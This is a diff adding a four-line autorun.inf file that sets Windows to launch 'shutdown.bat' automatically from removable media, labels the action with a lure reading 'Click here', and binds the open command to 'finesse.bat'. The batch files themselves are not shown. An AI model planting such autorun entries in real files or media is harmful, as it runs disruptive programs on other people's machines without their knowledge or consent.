@@ -1,0 +1,4 @@
+[autorun] 
+open=shutdown.bat 
+action="Click here" 
+shell\command\open=finesse.bat 
